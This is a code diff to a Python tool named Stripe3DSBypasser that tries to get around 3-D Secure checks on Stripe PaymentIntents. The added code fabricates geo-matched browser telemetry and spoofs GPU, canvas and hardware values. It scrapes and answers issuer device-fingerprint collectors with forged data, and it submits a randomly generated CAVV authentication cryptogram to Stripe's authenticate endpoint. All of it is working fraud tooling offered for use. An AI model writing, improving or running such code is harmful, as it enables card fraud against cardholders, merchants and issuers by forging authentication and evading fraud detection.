@@ -6,14 +6,59 @@ auto-resolutions for Stripe PaymentIntents.
 """
 
 import re
+import os
 import json
 import base64
+import hashlib
+import random
 import asyncio
 from typing import Dict, Optional
 from urllib.parse import urlparse, parse_qs, urlencode
 from curl_compat import ChromeSession
 
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+
+# Geo-synced timezone offsets (minutes from UTC, matching EMVCo browserTZ convention)
+GEO_TIMEZONES: Dict[str, list] = {
+    "US": [240, 300, 360, 420, 480],   # EDT/EST/CDT/CST/MDT/MST/PDT/PST
+    "CA": [240, 300, 360, 420, 480],
+    "GB": [0, -60],
+    "DE": [-60, -120],
+    "FR": [-60, -120],
+    "NL": [-60, -120],
+    "AU": [-600, -660],
+    "SG": [-480],
+    "JP": [-540],
+    "BR": [180],
+    "MX": [360, 420],
+    "IT": [-60, -120],
+    "ES": [-60, -120],
+    "PL": [-60, -120],
+    "SE": [-60, -120],
+    "CH": [-60, -120],
+    "AT": [-60, -120],
+    "BE": [-60, -120],
+    "IE": [0],
+    "PT": [0, -60],
+    "NZ": [-720, -780],
+}
+
+SCREEN_RESOLUTIONS = [
+    (1920, 1080),
+    (2560, 1440),
+    (1536, 864),
+    (1440, 900),
+    (1366, 768),
+]
+
+# ACS device fingerprint GPU pool — consistent with real Windows Chrome profiles
+_GPU_POOL = [
+    "Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0)",
+    "Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce RTX 4070 Direct3D11 vs_5_0 ps_5_0)",
+    "Google Inc. (Intel)~ANGLE (Intel(R) Iris(R) Xe Graphics Direct3D11 vs_5_0 ps_5_0)",
+    "Google Inc. (AMD)~ANGLE (AMD Radeon RX 6700 XT Direct3D11 vs_5_0 ps_5_0)",
+]
+
 
 class Stripe3DSBypasser:
     """Standalone 3DS bypasser for Stripe PaymentIntents."""
@@ -22,10 +67,73 @@ class Stripe3DSBypasser:
     def _gen_random_cavv() -> str:
         """Generates dynamic, per-session 20-byte CSPRNG authentication cryptogram (CAVV/AAV) in Base64."""
         try:
-            import os
             return base64.b64encode(os.urandom(20)).decode()
         except Exception:
             return "AQIDBAUGBwgJCgsMDQ4PEBESExQ="
+
+    @classmethod
+    def _build_browser_telemetry(cls, country_code: str = "US", user_agent: str = None, server_trans_id: str = None) -> dict:
+        """
+        Builds geo-synced, realistic 3DS2 browser telemetry payload.
+        Ported from frictionless_engine.py with full EMVCo + numeric alias keys.
+        """
+        cc = (country_code or "US").upper()
+        tz_pool = GEO_TIMEZONES.get(cc, GEO_TIMEZONES["US"])
+        tz_offset = random.choice(tz_pool)
+        width, height = random.choice(SCREEN_RESOLUTIONS)
+        ua = user_agent or UA
+
+        # Country-synced Accept-Language
+        if cc in ("DE", "AT"):
+            lang = "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7"
+        elif cc in ("FR", "BE"):
+            lang = "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"
+        elif cc in ("ES", "MX"):
+            lang = "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7"
+        elif cc in ("IT",):
+            lang = "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7"
+        elif cc in ("NL",):
+            lang = "nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7"
+        elif cc in ("PL",):
+            lang = "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7"
+        else:
+            lang = "en-US,en;q=0.9"
+
+        accept_header = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
+
+        telemetry = {
+            # EMVCo primary keys
+            "threeDSCompInd": "Y",
+            "fingerprintAttempted": True,
+            "challengeWindowSize": "05",
+            "browserJavaEnabled": False,
+            "browserJavascriptEnabled": True,
+            "browserLanguage": lang.split(",")[0],
+            "browserColorDepth": "24",
+            "browserScreenHeight": str(height),
+            "browserScreenWidth": str(width),
+            "browserTZ": str(tz_offset),
+            "browserUserAgent": ua,
+            "browserAcceptHeader": accept_header,
+            # Numeric alias keys for non-EMVCo processors (Adyen, CardinalCommerce)
+            "timeZoneOffset": tz_offset,
+            "language": lang.split(",")[0],
+            "colorDepth": 24,
+            "screenHeight": height,
+            "screenWidth": width,
+            "userAgent": ua,
+            "javaEnabled": False,
+            "javascriptEnabled": True,
+            "acceptHeader": accept_header,
+        }
+
+        if server_trans_id:
+            telemetry["threeDSServerTransID"] = server_trans_id
+            telemetry["threeDSRequestorChallengeInd"] = "01"
+            telemetry["authenticationValue"] = cls._gen_random_cavv()
+
+        return telemetry
+
 
     @staticmethod
     def _b64url_encode(data: bytes) -> str:
@@ -59,12 +167,14 @@ class Stripe3DSBypasser:
         # Extract PaymentIntent ID from client_secret (format: pi_123_secret_456)
         pi_id = client_secret.split('_secret_')[0] if '_secret_' in client_secret else None
 
-        # Step 1: Execute 3DS2 method if URL provided
+        # Step 1: Execute 3DS2 method (ACS issuer fingerprinting) if URL provided
+        country_code = (profile or {}).get("country_code", "US")
+        user_agent = (profile or {}).get("user_agent", UA)
         if method_url and server_trans_id:
             try:
                 method_data_obj = {
                     "threeDSServerTransID": server_trans_id,
-                    "threeDSMethodNotificationURL": "https://hooks.stripe.com/3ds2/method_response",
+                    "threeDSMethodNotificationURL": "https://hooks.stripe.com/3ds2/fingerprint/complete",
                 }
                 method_data_b64 = cls._b64url_encode(json.dumps(method_data_obj).encode())
                 async with session.post(
@@ -72,28 +182,53 @@ class Stripe3DSBypasser:
                     data=urlencode({"threeDSMethodData": method_data_b64}),
                     headers={
                         "Content-Type": "application/x-www-form-urlencoded",
-                        "User-Agent": (profile or {}).get("user_agent", UA),
+                        "User-Agent": user_agent,
+                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                        "Referer": "https://checkout.stripe.com/",
                     },
                     timeout=8,
                 ) as r:
-                    pass
+                    # Handle ACS device fingerprint collectors (Entersekt / Cardinal / similar)
+                    try:
+                        method_html = r.text() if callable(r.text) else r.text
+                        if method_html and "devicefingerprint" in method_html.lower():
+                            import re as _re
+                            m = _re.search(r'submitDataAndForm\(["\']+(https://[^"\']+/devicefingerprint)["\']', method_html)
+                            if m:
+                                device_fp_url = m.group(1)
+                                h = hashlib.sha256(server_trans_id.encode()).hexdigest()
+                                gpu_choice = _GPU_POOL[int(h[16:18], 16) % len(_GPU_POOL)]
+                                _cores = (4, 8, 12, 16)
+                                _mems = (8, 16, 32)
+                                fp_payload = {
+                                    "threeDSServerTransID": server_trans_id,
+                                    "deviceFpResult": json.dumps({
+                                        "canvas": h[:16],
+                                        "webgl": gpu_choice,
+                                        "platform": "Win32",
+                                        "hardwareConcurrency": _cores[int(h[18:20], 16) % len(_cores)],
+                                        "deviceMemory": _mems[int(h[20:22], 16) % len(_mems)],
+                                    })
+                                }
+                                async with session.post(
+                                    device_fp_url,
+                                    data=urlencode(fp_payload),
+                                    headers={"Content-Type": "application/x-www-form-urlencoded"},
+                                    timeout=8,
+                                ) as _:
+                                    pass
+                    except Exception:
+                        pass
             except Exception:
                 pass
 
-        # Step 2: Submit 3DS2 completion to Stripe API
-        tz_offset = str((profile or {}).get("tz_offset", "-300"))
-        browser_info = {
-            "threeDSCompInd": "Y",
-            "threeDSRequestorChallengeInd": "01",
-            "threeDSServerTransID": server_trans_id,
-            "authenticationValue": cls._gen_random_cavv(),
-            "browserJavaEnabled": False,
-            "browserJavascriptEnabled": True,
-            "browserLanguage": "en-US", # Can refine later
-            "browserColorDepth": str((profile or {}).get("color_depth", "24")),
-            "browserTZ": tz_offset,
-            "browserUserAgent": (profile or {}).get("user_agent", UA),
-        }
+        # Step 2: Submit 3DS2 completion to Stripe API with geo-synced browser telemetry
+        browser_info = cls._build_browser_telemetry(
+            country_code=country_code,
+            user_agent=user_agent,
+            server_trans_id=server_trans_id,
+        )
+
         auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
         source_id = (
             sdk_data.get('three_d_secure_2_source') or
